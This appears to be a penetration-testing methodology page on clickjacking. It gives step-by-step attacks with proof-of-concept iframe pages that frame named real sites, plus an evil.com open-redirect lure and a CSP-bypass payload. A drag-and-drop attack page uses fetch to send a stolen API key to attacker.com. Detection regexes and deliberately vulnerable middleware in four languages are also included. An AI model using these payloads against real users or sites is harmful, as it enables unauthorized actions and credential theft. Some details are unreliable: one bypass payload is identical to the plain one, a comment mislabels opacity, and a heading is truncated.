# Clickjacking

## Check List

## Methodology

### Black Box

#### [UI Redress Attack](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking#ui-redressing)

{% stepper %}
{% step %}
Go to your target website
{% endstep %}

{% step %}
generate HTML code to test for Clickjacking vulnerability, and change the src parameter to your target website

```html
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I Frame</title>
</head>
<body>
<h3>clickjacking vulnerability</h3>
<iframe src="https://target.com/" height="550px" width="700px"></iframe>
</body>
</html>
```
{% endstep %}

{% step %}
confirm that the HTML file is executed in your browser
{% endstep %}
{% endstepper %}

***

#### Missing X-Frame-Options

{% stepper %}
{% step %}
inspect the HTTP response headers of your target webpages and verify that `X-Frame-Options` is not set to `DENY` or `SAMEORIGIN`
{% endstep %}

{% step %}
Confirm that the target pages can be framed by external sites
{% endstep %}

{% step %}
Create a simple HTML page containing `<iframe>` elements that load the target URLs. The HTML file could look like this

```html
<html>
 <head> 
  <style>
      iframe{
        width:500px;
        height:900px;
      }
      #http{
        height:900px;
        width:500px;
      }
  </style> 
 </head>
 <body> 
  <h1>--------------------This is a malicious website-------------------</h1>
  <h1>The vulnerable website:-</nn></h1>
  <iframe src="https://sifchain.finance/"></iframe>
  <iframe id="http" src="https://dex.sifchain.finance/#/peg"></iframe>
 </body>
</html>
```
{% endstep %}

{% step %}
Open the crafted HTML page in a browser and observe that the target website renders successfully inside the iframe
{% endstep %}
{% endstepper %}

***

#### UI Overlay

{% stepper %}
{% step %}
Identify a webpage that lacks `X-Frame-Options` and `Content-Security-Policy:` frame-ancestors, allowing it to be embedded in an `iframe`
{% endstep %}

{% step %}
Create an HTML page that loads the target website inside an `<iframe>`
{% endstep %}

{% step %}
Apply CSS styling to the `iframe` to lower opacity, hide it, or position it beneath deceptive UI elements
{% endstep %}

{% step %}
Overlay fake buttons, text, or interactive elements on top of the `iframe` to mislead the user
{% endstep %}

{% step %}
final payload might look like this

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clickjacking PoC</title>
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.6; /* Makes the iframe invisible */
        z-index: 99;
    }

    button {
        z-index: 100;
        top:400px;
        position: relative;
    }
    h1 {
        top: 300px;
        position: relative;

    }
</style>
</head>
<body>
<h1>Click the button for a surprise!</h1>
<button onclick="alert('Surprise!')">Click Me!</button>

<!-- Invisible iframe targeting the account deletion URL -->
<iframe id="target-frame" src="https://topechelon.com/" frameborder="0"></iframe>

<script>
    
    document.getElementById('target-frame').onload = function() {
        
        console.log('Iframe has loaded, ready for clickjacking.');
    };
</script>
</body>
</html>
```
{% endstep %}

{% step %}
Host the malicious HTML page on any external server controlled by the attacker
{% endstep %}

{% step %}
Trick a victim into visiting the page through phishing, social engineering, or embedded links
{% endstep %}

{% step %}
Observe that user clicks interact with the underlying target website instead of the visible fake UI, confirming clickjacking


{% endstep %}
{% endstepper %}

***

#### Clickjacking To Open Redirect Chain

{% stepper %}
{% step %}
Visit the target login page and check whether the page can be framed (i.e., verify clickjacking potential)
{% endstep %}

{% step %}
Confirm that the site does not provide effective clickjacking protection  no `X-Frame-Options:` `DENY` or similar blocking headers
{% endstep %}

{% step %}
Create a simple HTML page that embeds the vulnerable URL inside an \<iframe>
{% endstep %}

{% step %}
Chain the clickjacking `iframe` with an open redirect on the target site, by directing clicks through the embedded frame to the redirect URL. The code might look like this

```html
<!DOCTYPE html>
<html>
<head>
<style>
iframe{
    width: 100%;
    height: 585px;
    border: none;
}
</style>
<title>Clickjacking</title>
</head>
<body>
<a onmouseover=window.open("https://evil.com") href="https://evil.com" style="z-index:1;left:900px;position:relative;top:150px;font-family: Montserrat;font-weight: 800;font-size:16px;text-transform: uppercase;color:red;text-decoration:none;font-style: normal;">
click here to win the prize </a>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-script"
style="opacity:1"
src="
https://example.com"></iframe>
</body>
</html>
```
{% endstep %}

{% step %}
Host this combined PoC so that when the victim clicks a link (“Click here to win the prize”), it triggers the click on the framed login page and causes the open redirect to execute
{% endstep %}

{% step %}
Observe the victim’s browser redirect to the attacker-controlled URL (via the open redirect), demonstrating the chain
{% endstep %}
{% endstepper %}

***

#### API Token Hijacking Through Clickjacking

{% stepper %}
{% step %}
inspect the HTTP response headers on token-related pages and confirm that the site does not enforce protections such as `X-Frame-Options:` `DENY` or `SAMEORIGIN`, or restrictive \``Content-Security-Policy` containing frame-ancestors
{% endstep %}

{% step %}
Create a test page that frames the target site and overlays custom elements exactly above the button used to reveal or copy the user’s API token
{% endstep %}

{% step %}
In the \<form> section of the testing page, configure a server endpoint you control (such as a Burp Collaborator URL) as the receiver for whatever the victim enters or submits during the interaction
{% endstep %}

{% step %}
Adjust the CSS (using low or zero opacity) so that the victim sees what appears to be the legitimate token-copy interface and is tricked into clicking the overlay, which actually triggers the real “copy token” functionality in the framed page
{% endstep %}

{% step %}
Guide the victim (via text or UI in the overlay) to paste the copied value into a visible input field on the attacker-controlled page, which then sends the submitted token to your controlled endpoint for verification
{% endstep %}
{% endstepper %}

***

#### CSP Bypass Clickjacking

{% stepper %}
{% step %}
Navigate to the vulnerable endpoint that loads account managers page with the origin parameter
{% endstep %}

{% step %}
Inspect the HTTP response headers and confirm that no `X-Frame-Options` header is present, while the page is protected only by a `CSP frame-ancestors` rule
{% endstep %}

{% step %}
Modify the origin parameter and confirm the CSP is reflected

```http
origin=https://example.com
```
{% endstep %}

{% step %}
Test whether subdomain variations are accepted by replacing the origin with another allowed host, such as

```http
origin=https://attacker.example.google.com
```
{% endstep %}

{% step %}
Bypass the CSP by injecting an illegal, URL-encoded control character before the allowed domain

```http
origin=https://attacker.example.google.com
```
{% endstep %}

{% step %}
Confirm that loading the URL with the payload removes the CSP `frame-ancestors` protection and the page becomes `iframe-able`
{% endstep %}

{% step %}
Create a simple HTML file to test clickjacking with the CSP-bypass vector

```html
<html>
<body>
<iframe 
src="https://useraccount.example.com/[vulnerable subdomain]&origin=https://%0d.example.com" 
width="1000" height="1000">
</iframe>
</body>
</html>
```
{% endstep %}

{% step %}
Load the HTML file in the browser and confirm that the account managers page renders inside the `iframe`, demonstrating the clickjacking vulnerability
{% endstep %}
{% endstepper %}

***

### White Box

#### State Mutation via Deprecated X-Frame-Options: ALLOW-FROM Fallback Asymmetr

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on B2B SaaS platforms, enterprise embedded widgets (e.g., payment gateways, booking calendars, analytics dashboards), or partner integrations that are explicitly designed to be framed by authorized third parties
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway or edge routing middleware responsible for injecting HTTP security headers
{% endstep %}

{% step %}
Identify the "Dynamic Framing Authorization" architecture. To prevent universal Clickjacking, the application must restrict framing. However, because the platform serves thousands of unique partner domains, it cannot hardcode a single domain
{% endstep %}

{% step %}
Investigate the header generation pipeline. The developer queries the database for the active partner's domain and dynamically constructs the HTTP security header to authorize the iframe embed
{% endstep %}

{% step %}
Analyze the protocol implementation. The developer, relying on legacy documentation or outdated security compliance checklists, utilizes the `X-Frame-Options` header with the `ALLOW-FROM` directive (e.g., `X-Frame-Options: ALLOW-FROM [https://trusted-partner.com](https://trusted-partner.com)`)
{% endstep %}

{% step %}
Discover the fatal protocol desynchronization: The developer assumes that all web browsers globally respect and enforce the `ALLOW-FROM` directive. They fail to implement the modern W3C standard equivalent: `Content-Security-Policy: frame-ancestors`
{% endstep %}

{% step %}
Understand the browser deprecation vulnerability: Modern browsers (Google Chrome, Safari, Mozilla Firefox) entirely deprecated and removed support for the `X-Frame-Options: ALLOW-FROM` directive years ago due to parsing inconsistencies. When a modern browser encounters `ALLOW-FROM`, it completely ignores the header
{% endstep %}

{% step %}
Formulate the UI Redressing payload. Because the legacy header is ignored and no modern `frame-ancestors` CSP exists, the browser defaults to `ALLOWALL`. The highly sensitive endpoint is universally frameable by any attacker on the internet
{% endstep %}

{% step %}
Identify a high-value, state-mutating endpoint on the target application that relies on cookie-based authentication (e.g., `[https://api.enterprise.tld/admin/users/delete?id=99](https://api.enterprise.tld/admin/users/delete?id=99)` or `/account/transfer`)
{% endstep %}

{% step %}
Construct an attacker-controlled HTML page. Embed the sensitive enterprise endpoint inside an `<iframe>`
{% endstep %}

{% step %}
Apply advanced CSS to execute the visual redressing: set the iframe's `opacity` to `0` or `0.001` (rendering it invisible but physically interactive), stretch it across the viewport, and manipulate the `z-index` to ensure it sits at the absolute top of the rendering stack
{% endstep %}

{% step %}
Position a highly attractive, benign decoy button (e.g., "Click here to claim your prize!" or "Play Video") directly underneath the precise X/Y coordinates of the invisible "Confirm Delete" or "Authorize Transfer" button within the framed enterprise application
{% endstep %}

{% step %}
Distribute the malicious page to an authenticated enterprise administrator
{% endstep %}

{% step %}
The victim views the page and attempts to click the benign decoy button. Because the invisible iframe sits on top of the Z-axis, the browser routes the physical hardware click directly into the framed enterprise application. The application, receiving a legitimate, authenticated user interaction, processes the state mutation. The attacker effortlessly executes unauthorized administrative actions via an invisible, proxy-driven interaction, exploiting the backend's reliance on a defunct security protocol

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Headers\.Add\("X-Frame-Options",\s*\$?"ALLOW-FROM)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(addHeader\("X-Frame-Options",\s*"ALLOW-FROM)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(header\("X-Frame-Options:\s*ALLOW-FROM)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(setHeader\(['"]X-Frame-Options['"],\s*`?ALLOW-FROM)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Headers\.Add\(\"X-Frame-Options\",\s*\\$\?\"ALLOW-FROM
```
{% endtab %}

{% tab title="Java" %}
```regexp
addHeader\(\"X-Frame-Options\",\s*\"ALLOW-FROM
```
{% endtab %}

{% tab title="PHP" %}
```regexp
header\(\"X-Frame-Options:\s*ALLOW-FROM
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
setHeader\(['\"]X-Frame-Options['\"],\s*`?ALLOW-FROM
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class FramingAuthorizationMiddleware
{
    private readonly RequestDelegate _next;
    private readonly IPartnerRepository _partnerRepo;

    public async Task InvokeAsync(HttpContext context)
    {
        var partnerId = context.Request.Query["partnerId"].FirstOrDefault();

        if (!string.IsNullOrEmpty(partnerId))
        {
            var partnerDomain = await _partnerRepo.GetDomainAsync(partnerId);

            // [1]
            // [2]
            // The developer relies on deprecated legacy headers for clickjacking protection.
            // Modern browsers explicitly ignore ALLOW-FROM, rendering the page universally frameable.
            // [3]
            // [4]
            context.Response.Headers.Add("X-Frame-Options", $"ALLOW-FROM {partnerDomain}");
            
            // Fatal omission: Missing Content-Security-Policy: frame-ancestors
        }
        else
        {
            context.Response.Headers.Add("X-Frame-Options", "DENY");
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class FramingAuthorizationFilter implements Filter {

    @Autowired
    private PartnerService partnerService;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse res = (HttpServletResponse) response;

        String partnerId = req.getParameter("partnerId");

        // [1]
        // [2]
        if (partnerId != null) {
            String partnerDomain = partnerService.getDomainForPartner(partnerId);
            
            // [3]
            // [4]
            // Java Spring Security natively sets DENY or SAMEORIGIN, but developers 
            // often override it to ALLOW-FROM to support legacy multi-tenant architectures
            // without realizing it exposes the application to modern browsers.
            res.setHeader("X-Frame-Options", "ALLOW-FROM " + partnerDomain);
        } else {
            res.setHeader("X-Frame-Options", "SAMEORIGIN");
        }

        chain.doFilter(request, response);
    }
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class FramingMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);
        $partnerId = $request->query('partnerId');

        // [1]
        // [2]
        if ($partnerId) {
            $partnerDomain = PartnerService::getDomain($partnerId);
            
            // [3]
            // [4]
            // The browser's console will display a warning that ALLOW-FROM is deprecated, 
            // but the backend developer never sees client-side console warnings.
            $response->header('X-Frame-Options', "ALLOW-FROM {$partnerDomain}");
        } else {
            $response->header('X-Frame-Options', 'SAMEORIGIN');
        }

        return $response;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class FramingMiddleware {
    static async authorizeIframe(req, res, next) {
        let partnerId = req.query.partnerId;

        if (partnerId) {
            let partnerDomain = await db.Partner.getDomain(partnerId);

            // [1]
            // [2]
            // Chrome and Firefox will drop this header. The page will load in any iframe.
            // [3]
            // [4]
            res.setHeader('X-Frame-Options', `ALLOW-FROM ${partnerDomain}`);
        } else {
            res.setHeader('X-Frame-Options', 'SAMEORIGIN');
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture supports embedded widget integrations, explicitly requiring the application to disable strict `DENY` or `SAMEORIGIN` framing policies on specific routes, \[2] To enforce security, developers attempt to whitelist specific, trusted partner domains, \[3] Developers utilize the `X-Frame-Options: ALLOW-FROM` header, relying on outdated HTTP RFCs and legacy compliance scanners that still flag the absence of `X-Frame-Options` while ignoring the modern CSP equivalent, \[4] The execution paradox. The backend successfully calculates the trusted domain and attaches the security header, fulfilling the developer's logical intent. However, major web browser engines intentionally stripped support for `ALLOW-FROM` due to the impossibility of validating deep, nested iframe chains. When Chrome or Safari encounters this header, it discards it entirely. Because the developer failed to provide the modern fallback (`Content-Security-Policy: frame-ancestors`), the browser defaults to an open security model. The attacker effortlessly encapsulates the highly privileged enterprise route within a hostile origin, constructing an invisible overlay that converts innocuous user interactions into authenticated, catastrophic state mutations

```http
// 1. Attacker verifies the target endpoint uses the deprecated header.
GET /admin/users/delete?id=105&partnerId=88 HTTP/1.1
Host: api.enterprise.tld

// Backend returns:
HTTP/1.1 200 OK
X-Frame-Options: ALLOW-FROM https://trusted-partner.com
Content-Type: text/html

// 2. Attacker hosts a malicious webpage at https://evil.com/clickjack.html.
// 3. The attacker crafts the CSS and HTML to perfectly overlay a decoy button 
//    beneath the invisible iframe's "Confirm Delete" button.

<html>
<head>
    <style>
        iframe {
            position: absolute;
            top: 0; left: 0;
            width: 1000px; height: 800px;
            opacity: 0.0001; /* Invisible but clickable */
            z-index: 10;
        }
        .decoy-button {
            position: absolute;
            top: 450px; left: 300px; /* Aligned with the iframe's target button */
            z-index: 1;
        }
    </style>
</head>
<body>
    <button class="decoy-button">Click here to claim your $500 Gift Card!</button>
    <iframe src="https://api.enterprise.tld/admin/users/delete?id=105&partnerId=88"></iframe>
</body>
</html>

// 4. The victim (an Enterprise Admin) visits https://evil.com/clickjack.html.
// 5. The Chrome browser ignores the `ALLOW-FROM` header and renders the iframe.
// 6. The victim clicks the "Claim Gift Card" button.
// 7. The browser registers the click on the invisible iframe's "Confirm Delete" button.
// 8. The enterprise application deletes User 105.
```
{% endstep %}

{% step %}
To support complex B2B iframe integrations, platform architects implemented dynamic origin whitelisting for embedded routes. The security failure stemmed from a deep architectural disconnect between backend header generation and modern browser enforcement policies. Developers relied exclusively on the `X-Frame-Options: ALLOW-FROM` directive, erroneously equating legacy compliance with functional security. Modern browser engines, having deprecated this directive in favor of `Content-Security-Policy: frame-ancestors`, silently ignored the backend's explicit instructions. This degradation dropped the application into an inherently insecure default state. The attacker exploited this by framing the authenticated, state-mutating endpoint across an unauthorized origin. By employing CSS opacity and Z-index manipulation, the attacker decoupled the user's visual perception from the browser's physical click routing, successfully hijacking the administrator's physical intent to execute high-privilege, destructive operations on the enterprise platform
{% endstep %}
{% endstepper %}

***

#### Cross-Origin Data Exfiltration via HTML5 Drag-and-Drop (DnD) UI Redressing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on endpoints that intentionally omit framing protection to serve as "Public" or "Shareable" resources (e.g., Public Profiles, Shared Document Links, or Status Pages), but conditionally render highly sensitive data if the viewing user happens to be authenticated
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's routing and security header middleware
{% endstep %}

{% step %}
Identify the "Public Share Bypass" architecture. To allow users to embed their public profiles or shared invoices in external blogs or notion pages, the developer explicitly removes the `X-Frame-Options` and `frame-ancestors` headers on specific API routes (e.g., `GET /share/profile/{id}`)
{% endstep %}

{% step %}
Investigate the conditional rendering logic. While the route is intended for public consumption, the backend template engine (or frontend SPA) checks the user's active session cookie. If the user viewing the public iframe is actually the _owner_ of the profile, the UI conditionally renders private data (e.g., an API Key, a hidden email address, or a password reset link) within the framed view
{% endstep %}

{% step %}
Analyze the standard Clickjacking defenses. Standard UI Redressing relies on forcing a victim to _click_ a button to mutate state (e.g., clicking "Delete"). However, exfiltrating data (reading the API key) via Clickjacking is impossible because the browser's Same-Origin Policy (SOP) prevents the attacker's parent frame from reading the DOM of the cross-origin iframe
{% endstep %}

{% step %}
Discover the HTML5 API loophole: The HTML5 Drag-and-Drop (DnD) API fundamentally bypasses the Same-Origin Policy. If a user physically clicks and drags an element (like highlighted text or a hyperlink) from an iframe into a different frame or window, the browser's native `DataTransfer` object carries the payload across the cross-origin boundary
{% endstep %}

{% step %}
Understand the vulnerability: If an attacker can frame a page containing sensitive data, they can trick the user into highlighting and dragging that data out of the iframe and dropping it into an attacker-controlled drop zone, completely breaking cross-origin read restrictions
{% endstep %}

{% step %}
Formulate the Zero-Click Data Exfiltration payload. Identify a sensitive, draggable element within the conditionally rendered, frameable page (e.g., `<a href="[https://api.tld/reset?token=SECRET](https://api.tld/reset?token=SECRET)">Reset</a>` or a raw text field containing an API Key)
{% endstep %}

{% step %}
Construct an attacker-controlled HTML page containing the target iframe, styled with `opacity: 0.001`
{% endstep %}

{% step %}
Build a complex, interactive decoy UI beneath the iframe. The UI must psychologically coerce the user into performing a specific sequence: clicking down at Coordinate A, dragging the mouse, and releasing the click at Coordinate B. (e.g., "Drag the puzzle piece to the circle to prove you are human and unlock the video!")
{% endstep %}

{% step %}
Align the invisible iframe such that "Coordinate A" perfectly overlaps the sensitive API Key or Link in the enterprise application
{% endstep %}

{% step %}
Align "Coordinate B" with a visible, attacker-controlled `<div id="dropzone">` in the parent HTML
{% endstep %}

{% step %}
Distribute the payload to the authenticated victim
{% endstep %}

{% step %}
The victim attempts to drag the fake "puzzle piece". In reality, their cursor selects and drags the invisible sensitive text/link from the enterprise iframe. When they drop the item into the attacker's visible drop zone, the attacker's JavaScript intercepts the `ondrop` event, reads `event.dataTransfer.getData('text')`, and silently exfiltrates the highly classified API key to the attacker's server, completely shattering the Same-Origin Policy via physical user coercion

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(context\.Response\.Headers\.Remove\("X-Frame-Options"\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(policy\.disableFrameOptions\(\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$response->headers->remove\('X-Frame-Options'\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(if\s*\(req\.path\.startsWith\('/share/'\)\)\s*\{\s*res\.removeHeader\('X-Frame-Options'\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
context\.Response\.Headers\.Remove\(\"X-Frame-Options\"\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
policy\.disableFrameOptions\(\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$response->headers->remove\('X-Frame-Options'\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
if\s*\(req\.path\.startsWith\('/share/'\)\)\s*\{\s*res\.removeHeader\('X-Frame-Options'\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        context.Response.Headers.Add("X-Frame-Options", "DENY");
        context.Response.Headers.Add("Content-Security-Policy", "frame-ancestors 'none'");

        // [1]
        // [2]
        if (context.Request.Path.StartsWithSegments("/public/share"))
        {
            // Disabling protection to allow embedding in external blogs/forums
            context.Response.Headers.Remove("X-Frame-Options");
            context.Response.Headers.Remove("Content-Security-Policy");
        }

        await _next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class SecurityHeadersInterceptor
        implements HandlerInterceptor {


    @Override
    public void afterCompletion(
            HttpServletRequest request,
            HttpServletResponse response,
            Object handler,
            Exception ex
    ) {


        response.setHeader(
                "X-Frame-Options",
                "DENY"
        );


        response.setHeader(
                "Content-Security-Policy",
                "frame-ancestors 'none'"
        );



        // [1]
        // [2]
        // [3]
        // [4]
        if (request.getRequestURI()
                .startsWith("/public/share/")) {


            response
                .setHeader(
                    "X-Frame-Options",
                    ""
                );


            response
                .setHeader(
                    "Content-Security-Policy",
                    ""
                );
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SecurityHeadersMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);

        $response->header('X-Frame-Options', 'DENY');
        $response->header('Content-Security-Policy', "frame-ancestors 'none'");

        // [1]
        // [2]
        // [3]
        // [4]
        if ($request->is('public/share/*')) {
            $response->headers->remove('X-Frame-Options');
            $response->headers->remove('Content-Security-Policy');
        }

        return $response;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SecurityHeadersMiddleware {
    static applyHeaders(req, res, next) {
        // Apply default strict framing protection
        res.setHeader('X-Frame-Options', 'DENY');
        res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");

        // [1]
        // [2]
        // The developer intentionally drops framing protection for "shareable" public links
        if (req.path.startsWith('/public/share/')) {
            res.removeHeader('X-Frame-Options');
            res.removeHeader('Content-Security-Policy');
        }

        next();
    }
}

// In the Profile Controller:
router.get('/public/share/:id', async (req, res) => {
    let profile = await Profile.findByPk(req.params.id);
    
    // [3]
    // [4]
    // Conditional rendering embeds highly classified data into the "public" 
    // page if the active viewer happens to own the profile.
    let privateApiKeyHtml = '';
    if (req.user && req.user.id === profile.userId) {
        privateApiKeyHtml = `<div id="secret-key">API_KEY: ${profile.apiKey}</div>`;
    }

    res.send(`
        <html>
            <body>
                <h1>${profile.publicName}</h1>
                ${privateApiKeyHtml}
            </body>
        </html>
    `);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture features specific routes designed for public consumption and external integration, necessitating the deliberate removal of restrictive framing headers (`X-Frame-Options` and `frame-ancestors`), \[2] To maximize code reuse and avoid maintaining disparate templates for public vs. authenticated views, developers utilize conditional UI rendering, \[3] The architecture assumes that because an iframe is subject to the browser's strict Same-Origin Policy (SOP), a cross-origin attacker parent frame is mathematically prohibited from reading the DOM contents of the framed child window, \[4] The execution paradox. Developers conflated programmatic DOM access restrictions with physical API capabilities. While JavaScript cannot pierce the iframe boundary programmatically, the HTML5 Drag-and-Drop (DnD) specification explicitly allows data to traverse origins to facilitate native OS-level drag-and-drop operations. By selectively omitting framing headers on routes that conditionally display sensitive data, the backend provided the canvas. The attacker leverages UI Redressing not to induce a click, but to meticulously choreograph a physical drag sequence. The victim's own physical interaction bypasses the SOP, extracting the sensitive text from the invisible iframe and dropping it into the attacker's waiting JavaScript execution sink

```http
// 1. Attacker verifies that /public/share/profile lacks frame-ancestors.
// 2. Attacker knows that if the profile owner views this page, their API key is 
//    rendered at specific coordinates (e.g., top: 200px, left: 100px).
// 3. Attacker constructs the complex Drag-and-Drop redressing payload:

<html>
<head>
    <style>
        #target-iframe {
            position: absolute;
            top: 0; left: 0;
            width: 800px; height: 600px;
            opacity: 0.001; /* Invisible */
            z-index: 10;
        }
        #fake-slider {
            position: absolute;
            top: 190px; left: 90px; /* Aligned over the API key */
            width: 150px; height: 40px;
            background: red; color: white; text-align: center;
            z-index: 1; /* Underneath the iframe */
        }
        #attacker-dropzone {
            position: absolute;
            top: 190px; left: 500px;
            width: 200px; height: 200px;
            background: green;
            z-index: 20; /* Above the iframe to catch the drop */
        }
    </style>
</head>
<body>
    <div id="fake-slider">Drag me to the green box!</div>
    <div id="attacker-dropzone">Drop here to verify!</div>
    
    <!-- The vulnerable endpoint -->
    <iframe id="target-iframe" src="https://api.enterprise.tld/public/share/my-profile"></iframe>

    <script>
        const dropzone = document.getElementById('attacker-dropzone');
        
        // Allow dropping
        dropzone.addEventListener('dragover', (e) => { e.preventDefault(); });
        
        // Intercept the data crossing the cross-origin boundary
        dropzone.addEventListener('drop', (e) => {
            e.preventDefault();
            const stolenData = e.dataTransfer.getData('text');
            
            // Exfiltrate the API key silently
            fetch('https://attacker.com/leak?data=' + encodeURIComponent(stolenData));
            dropzone.innerText = "Verified!";
        });
    </script>
</body>
</html>

// 4. The victim visits the attacker's page.
// 5. The victim clicks on the red "Drag me" box. The browser registers the click 
//    on the invisible API Key text within the enterprise iframe.
// 6. The victim drags their mouse and releases it over the green "Drop here" box.
// 7. The browser's native DataTransfer API ferries the selected API key out of the iframe 
//    and hands it to the attacker's drop event listener.
// 8. The attacker successfully reads the API key, breaking the Same-Origin Policy without XSS.
```
{% endstep %}

{% step %}
To support external content embedding, infrastructure engineers selectively disabled protective framing headers on public-facing routes. Concurrently, to optimize template management, they implemented state-dependent conditional rendering, embedding sensitive administrative artifacts into these "public" pages when viewed by authenticated owners. This optimization was predicated on the assumption that the browser's Same-Origin Policy (SOP) guaranteed read-isolation between nested cross-origin execution contexts. The security framework failed by overlooking the intentional, spec-compliant SOP bypass mechanics engineered into the HTML5 Drag-and-Drop API. The attacker weaponized this specification by constructing an invisible overlay and a deceptive kinetic puzzle. By guiding the victim through a precise physical interaction, the attacker forced the victim's browser to actively lift the highly classified data from the protected iframe and carry it across the origin boundary into the hostile execution context, resulting in a zero-click, zero-script data exfiltration via pure psychological and structural manipulation
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
